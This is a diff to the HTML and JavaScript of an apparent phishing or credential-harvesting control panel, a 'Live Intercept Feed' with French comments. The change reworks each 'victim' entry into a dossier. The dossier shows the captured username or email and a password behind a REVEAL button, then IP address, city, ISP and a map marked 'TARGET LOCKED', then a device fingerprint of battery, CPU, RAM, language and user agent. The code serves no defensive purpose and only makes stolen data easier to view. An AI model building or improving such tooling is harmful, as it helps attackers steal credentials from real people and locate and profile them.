@@ -32,22 +32,28 @@
         .victim-summary::-webkit-details-marker { display: none; }
         .victim-summary:hover { background: #18181b; }
 
-        .data-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; padding: 16px; background: #050505; border-top: 1px solid #27272a; }
-        @media (min-width: 768px) { .data-grid { grid-template-columns: repeat(4, 1fr); } }
-        .data-cell { display: flex; flex-direction: column; padding: 6px 8px; background: #09090b; border: 1px solid #18181b; border-radius: 4px; }
-        .data-label { font-size: 0.6rem; color: #71717a; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px; }
-        .data-val { font-size: 0.75rem; color: #d4d4d8; word-break: break-all; }
-        .data-val.highlight { color: #22c55e; }
-        .data-val.danger { color: #ef4444; }
-
-        .cred-box { margin: 16px; padding: 12px; background: #1c1917; border: 1px dashed #ef4444; border-radius: 4px; }
-        .cred-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; border-bottom: 1px solid #27272a; }
-        .cred-row:last-child { border-bottom: none; }
-        .cred-label { font-size: 0.7rem; color: #a1a1aa; font-weight: bold; }
-        .cred-val { font-size: 0.9rem; color: #fbbf24; font-weight: bold; }
+        /* Nouveau design de données */
+        .dossier-section { border-bottom: 1px solid #27272a; padding: 16px; }
+        .dossier-title { font-size: 0.7rem; font-weight: 800; color: #71717a; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
         
-        .toggle-pass { font-size: 0.6rem; background: #ef4444; color: white; padding: 2px 6px; border-radius: 3px; cursor: pointer; margin-left: 10px; font-weight: bold; }
-        .toggle-pass:hover { background: #b91c1c; }
+        .cred-card { background: #1c1917; border: 1px dashed #ef4444; border-radius: 6px; padding: 12px; }
+        .cred-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #27272a; }
+        .cred-item:last-child { border-bottom: none; }
+        .cred-label { font-size: 0.75rem; color: #a1a1aa; font-weight: bold; }
+        .cred-value { font-size: 1rem; color: #fbbf24; font-weight: bold; font-family: monospace; }
+        
+        .reveal-btn { font-size: 0.65rem; background: #ef4444; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-left: 12px; transition: 0.2s; }
+        .reveal-btn:hover { background: #b91c1c; }
+
+        .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+        @media (min-width: 768px) { .info-grid { grid-template-columns: repeat(4, 1fr); } }
+        
+        .info-box { background: #09090b; border: 1px solid #18181b; border-radius: 6px; padding: 10px; }
+        .info-label { font-size: 0.6rem; color: #71717a; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
+        .info-value { font-size: 0.8rem; color: #d4d4d8; font-weight: bold; word-break: break-all; }
+        .info-value.green { color: #22c55e; }
+        .info-value.red { color: #ef4444; }
+        .info-value.blue { color: #3b82f6; }
 
         .blink { animation: blink 1s step-end infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
@@ -69,7 +75,6 @@
             </div>
         </div>
         <h1 class="text-2xl md:text-3xl font-extrabold text-white tracking-widest uppercase mt-4">Live Intercept Feed</h1>
-        <p class="text-zinc-500 text-sm mt-1">Monitoring unauthorized access attempts and captured payloads.</p>
         <div class="mt-4 flex gap-4 text-xs">
             <div class="text-zinc-400">Status: <span class="text-green-500 font-bold">ACTIVE</span></div>
             <div class="text-zinc-400">Total Targets: <span id="total-count" class="text-red-500 font-bold">0</span></div>
@@ -174,44 +179,81 @@
                     `;
                     victimDetails.appendChild(victimSummary);
 
+                    // --- LE DOSSIER COMPLET ---
                     const victimContent = document.createElement('div');
+                    
                     let mapHtml = '';
                     if (victim.latitude && victim.longitude) {
-                        mapHtml = `<div class="px-4 pb-2"><iframe class="w-full h-40 rounded border border-zinc-800" src="https://maps.google.com/maps?q=${victim.latitude},${victim.longitude}&z=13&output=embed" loading="lazy"></iframe></div>`;
+                        mapHtml = `
+                            <div class="mt-2 rounded-md overflow-hidden border border-zinc-800 relative">
+                                <iframe class="w-full h-48" src="https://maps.google.com/maps?q=${victim.latitude},${victim.longitude}&z=14&output=embed" loading="lazy"></iframe>
+                                <div class="absolute top-2 left-2 bg-red-600 text-white text-[10px] font-bold px-2 py-1 rounded">TARGET LOCKED</div>
+                            </div>
+                        `;
                     }
 
-                    // On échappe correctement les caractères spéciaux pour le mot de passe
                     const safePassword = victim.password ? victim.password.replace(/\\/g, '\\\\').replace(/'/g, "\\'") : '';
 
                     victimContent.innerHTML = `
-                        <div class="cred-box">
-                            <div class="text-red-500 text-xs font-bold uppercase mb-2">Intercepted Credentials</div>
-                            <div class="cred-row">
-                                <span class="cred-label">USERNAME</span>
-                                <span class="cred-val">${victim.username || '-'}</span>
-                            </div>
-                            <div class="cred-row">
-                                <span class="cred-label">PASSWORD</span>
-                                <div>
-                                    <span class="cred-val" id="pw-${victim.id}">••••••••</span>
-                                    <span class="toggle-pass" onclick="
-                                        const el = document.getElementById('pw-${victim.id}');
-                                        if(el.textContent === '••••••••') { el.textContent = '${safePassword}' || 'EMPTY'; } 
-                                        else { el.textContent = '••••••••'; }
-                                    ">REVEAL</span>
+                        <!-- 1. IDENTIFIANTS -->
+                        <div class="dossier-section bg-red-950/20">
+                            <div class="dossier-title text-red-500"><span class="w-2 h-2 bg-red-500 rounded-full animate-ping"></span> INTERCEPTED CREDENTIALS</div>
+                            <div class="cred-card">
+                                <div class="cred-item">
+                                    <span class="cred-label">USERNAME / EMAIL</span>
+                                    <span class="cred-value">${victim.username || '-'}</span>
+                                </div>
+                                <div class="cred-item">
+                                    <span class="cred-label">PASSWORD</span>
+                                    <div class="flex items-center">
+                                        <span class="cred-value" id="pw-${victim.id}">••••••••</span>
+                                        <span class="reveal-btn" onclick="
+                                            const el = document.getElementById('pw-${victim.id}');
+                                            if(el.textContent === '••••••••') { el.textContent = '${safePassword}' || 'EMPTY'; } 
+                                            else { el.textContent = '••••••••'; }
+                                        ">REVEAL</span>
+                                    </div>
                                 </div>
                             </div>
                         </div>
-                        ${mapHtml}
-                        <div class="data-grid">
-                            <div class="data-cell"><span class="data-label">IP Address</span><span class="data-val highlight">${victim.ip || '-'}</span></div>
-                            <div class="data-cell"><span class="data-label">City</span><span class="data-val">${victim.ville || '-'}</span></div>
-                            <div class="data-cell"><span class="data-label">Country</span><span class="data-val">${victim.pays || '-'}</span></div>
-                            <div class="data-cell"><span class="data-label">ISP</span><span class="data-val">${victim.isp || '-'}</span></div>
-                            <div class="data-cell"><span class="data-label">Battery</span><span class="data-val danger">${victim.batterie || '-'}</span></div>
-                            <div class="data-cell"><span class="data-label">Charging</span><span class="data-val">${victim.etat_batterie || '-'}</span></div>
-                            <div class="data-cell"><span class="data-label">Device</span><span class="data-val">${victim.type_appareil || '-'}</span></div>
-                            <div class="data-cell"><span class="data-label">Connection</span><span class="data-val">${victim.connexion || '-'}</span></div>
+
+                        <!-- 2. LOCALISATION -->
+                        <div class="dossier-section">
+                            <div class="dossier-title">📍 GEOLOCATION DATA</div>
+                            <div class="info-grid mb-3">
+                                <div class="info-box"><div class="info-label">IP Address</div><div class="info-value green">${victim.ip || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">City</div><div class="info-value">${victim.ville || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">Country</div><div class="info-value">${victim.pays || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">ISP</div><div class="info-value">${victim.isp || 'Unknown'}</div></div>
+                            </div>
+                            ${mapHtml}
+                        </div>
+
+                        <!-- 3. MATERIEL & RESEAU -->
+                        <div class="dossier-section">
+                            <div class="dossier-title">📱 DEVICE FINGERPRINT</div>
+                            <div class="info-grid">
+                                <div class="info-box"><div class="info-label">Device Model</div><div class="info-value">${victim.type_appareil || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">Screen Resolution</div><div class="info-value">${victim.resolution || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">CPU Cores</div><div class="info-value">${victim.cpu || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">RAM Memory</div><div class="info-value">${victim.ram || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">Battery Level</div><div class="info-value red">${victim.batterie || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">Battery Status</div><div class="info-value">${victim.etat_batterie || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">Network Type</div><div class="info-value blue">${victim.connexion || 'Unknown'}</div></div>
+                                <div class="info-box"><div class="info-label">Language</div><div class="info-value">${victim.langue || 'Unknown'}</div></div>
+                            </div>
+                        </div>
+
+                        <!-- 4. METADATA -->
+                        <div class="dossier-section border-none pb-4">
+                            <div class="dossier-title">⏱️ SESSION METADATA</div>
+                            <div class="info-grid mb-2">
+                                <div class="info-box col-span-2"><div class="info-label">Timestamp (Local)</div><div class="info-value">${victim.heure_locale || 'Unknown'}</div></div>
+                            </div>
+                            <div class="info-box">
+                                <div class="info-label">Raw User Agent</div>
+                                <div class="info-value text-xs text-zinc-500 font-normal mt-1">${victim.user_agent || 'Unknown'}</div>
+                            </div>
                         </div>
                     `;
                     victimDetails.appendChild(victimContent);
